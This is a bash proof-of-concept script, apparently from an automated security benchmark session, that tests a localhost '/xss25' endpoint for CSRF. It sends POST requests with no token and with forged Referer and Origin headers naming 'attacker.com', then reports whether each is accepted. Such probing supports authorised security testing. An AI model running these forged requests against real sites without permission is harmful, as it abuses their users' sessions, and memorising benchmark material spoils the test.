#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /xss25 endpoint by submitting POST requests without CSRF token validation and without proper origin/referer checking
# Target: ./repo
# Created: 2025-11-06T19:27:03.277Z
# Session: benchmark-XBEN-004-24-mhnt8bw2

# CSRF Vulnerability POC for /xss25 endpoint
# This demonstrates that the endpoint accepts POST requests without CSRF token validation
# and without proper origin/referer header validation

TARGET_URL="http://localhost:5000/xss25"
SOLUTION_DATA="test_csrf_payload"

echo "[*] CSRF Vulnerability Test for /xss25"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Check if CSRF token is present in the GET response
echo "[Step 1] Checking for CSRF token in GET response..."
GET_RESPONSE=$(curl -s "$TARGET_URL")

if echo "$GET_RESPONSE" | grep -qi "csrf"; then
    echo "[!] CSRF token found in GET response"
    CSRF_TOKEN=$(echo "$GET_RESPONSE" | grep -oP 'name=["\047]csrf["\047][^>]*value=["\047]?\K[^"'\'']*' | head -1)
    if [ -n "$CSRF_TOKEN" ]; then
        echo "[+] CSRF Token: $CSRF_TOKEN"
    fi
else
    echo "[+] No CSRF token found in GET response - VULNERABLE"
fi

echo ""

# Step 2: Attempt POST request WITHOUT CSRF token (simulating attacker from external origin)
echo "[Step 2] Attempting POST request without CSRF token from external origin..."

POST_RESPONSE=$(curl -s -X POST \
  "$TARGET_URL" \
  -d "solution=$SOLUTION_DATA" \
  -H "User-Agent: Mozilla/5.0" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$POST_RESPONSE" | tail -1)
RESPONSE_BODY=$(echo "$POST_RESPONSE" | sed '$d')

echo "[*] HTTP Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] POST request ACCEPTED without CSRF token - VULNERABLE"
else
    echo "[-] POST request REJECTED with code $HTTP_CODE"
fi

echo ""

# Step 3: Attempt POST request WITH a forged referer (should still work if no validation)
echo "[Step 3] Attempting POST request with forged referer from attacker domain..."

POST_RESPONSE_FORGED=$(curl -s -X POST \
  "$TARGET_URL" \
  -d "solution=$SOLUTION_DATA" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Referer: http://attacker.com/malicious.html" \
  -w "\n%{http_code}")

HTTP_CODE_FORGED=$(echo "$POST_RESPONSE_FORGED" | tail -1)

echo "[*] HTTP Response Code (with forged referer): $HTTP_CODE_FORGED"

if [ "$HTTP_CODE_FORGED" = "200" ]; then
    echo "[+] POST request with forged referer ACCEPTED - CSRF validation NOT enforced"
else
    echo "[-] POST request with forged referer REJECTED"
fi

echo ""

# Step 4: Test if origin header is validated
echo "[Step 4] Attempting POST request with forged origin..."

POST_RESPONSE_ORIGIN=$(curl -s -X POST \
  "$TARGET_URL" \
  -d "solution=$SOLUTION_DATA" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Origin: http://attacker.com" \
  -w "\n%{http_code}")

HTTP_CODE_ORIGIN=$(echo "$POST_RESPONSE_ORIGIN" | tail -1)

echo "[*] HTTP Response Code (with forged origin): $HTTP_CODE_ORIGIN"

if [ "$HTTP_CODE_ORIGIN" = "200" ]; then
    echo "[+] POST request with forged origin ACCEPTED - Origin validation NOT enforced"
else
    echo "[-] POST request with forged origin REJECTED"
fi

echo ""

# Step 5: Summary
echo "[*] CSRF Vulnerability Summary:"
if [ "$HTTP_CODE" = "200" ] && [ "$HTTP_CODE_FORGED" = "200" ]; then
    echo "[!] CONFIRMED: The /xss25 endpoint is vulnerable to CSRF attacks"
    echo "[!] The endpoint accepts POST requests without:"
    echo "    - CSRF token validation"
    echo "    - Origin header validation"
    echo "    - Referer header validation"
    exit 0
else
    echo "[-] Some CSRF protections may be in place"
    exit 1
fi